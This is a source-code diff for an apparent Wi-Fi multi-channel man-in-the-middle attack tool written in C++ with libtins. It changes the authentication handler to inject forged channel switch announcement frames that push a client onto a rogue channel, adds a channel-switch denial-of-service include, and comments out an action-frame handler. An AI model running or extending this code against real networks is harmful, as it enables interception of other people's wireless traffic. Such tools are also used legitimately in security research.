@@ -1,4 +1,6 @@
 #include <tins/tins.h>
+
+#include "attacks/DoS_soft/channel_switch/channel_switch.h"
 #include "attacks/mc_mitm/mc_mitm.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
@@ -18,9 +20,6 @@ void McMitm::send_to_real(const frame_raw_t &raw) const{
 	sock_real->send(raw, netconfig.real_channel);
 }
 
-//FIXME change bool to PProcess::continue; PProcess::stop (with change to bool for
-
-// not
 FrameProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, const Dot11 &dot11){
 	if(addr1 != ap.get(SK::mac)) return CONTINUE;
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
@@ -29,8 +28,12 @@ FrameProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, cons
 		if(client_state.get_mac() == client_addr) {
 			display_traffic(dot11, "Real channel, injecting CSA beacon to try to correct");
 
-			send_csa_beacon(1, client_addr);
-			send_csa_beacon();
+			//TODO useless?
+			CSA_attack::update_time_CSA_frames(csa_frames);
+			for(auto &csa_frame : csa_frames) {
+				send_to_real(csa_frame);
+				//interruptible_sleep(milliseconds(100)); //TODo
+			}
 
 			client_state.update_state(ClientState::Sent_to_rogue);
 			return STOP;
@@ -39,7 +42,7 @@ FrameProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, cons
 	return CONTINUE;
 }
 
-FrameProcess McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const vector<unsigned char> &raw,
+/*FrameProcess McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const vector<unsigned char> &raw,
 								const Dot11 &dot11
 ) const{
 	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return CONTINUE;
@@ -69,7 +72,7 @@ FrameProcess McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, con
 		return STOP;
 	}
 	return CONTINUE;
-}
+}*/
 
 FrameProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const{
 	// EAPOL AP -> STA on real channel
@@ -144,7 +147,6 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const frame_raw_t &
 
 	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;
 
-	//TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
 	SOLVE_OR_CONTINUE(handle_eapol_real(addr1, addr2, *dot11))
 	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
 	#undef SOLVE_OR_CONTINUE
